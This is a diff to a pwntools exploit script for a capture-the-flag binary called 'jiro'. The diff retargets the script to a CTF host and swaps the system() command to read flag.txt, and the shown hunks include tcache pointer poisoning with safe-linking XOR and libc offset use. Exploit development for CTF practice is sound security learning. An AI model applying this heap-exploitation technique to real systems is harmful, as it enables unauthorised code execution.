@@ -5,16 +5,17 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or './jiro')
-libc = ELF('./libc.so.6')
+exe = context.binary = ELF(args.EXE or './app/jiro')
+libc = ELF('./app/libc.so.6')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
-host = args.HOST or '109.233.56.90'
+host = args.HOST or 'ctfd.cybpaws.su'
 port = int(args.PORT or 11777)
+
 
 
 def start_local(argv=[], *a, **kw):
@@ -64,7 +65,6 @@ io = start()
 
 def read_menu():
     io.recvuntil(b'>> ')
-
 
 def hire(name):
     io.sendline(b'1')
@@ -206,7 +206,7 @@ FREE_OFFSET = 0x5000
 edit_employee(first, p64((addr >> 12) ^ (pie_base + FREE_OFFSET)))
 
 hire(b'D' * 0x70)
-cmd = b'/bin/ls -ahl\x00'
+cmd = b'/bin/cat flag.txt\x00'
 binsh_employee = hire(cmd + (0x70 - len(cmd)) * b'D')
 SYSTEM_OFFSET = libc.sym['system']
 PUTS_OFFSET = libc.sym['puts']
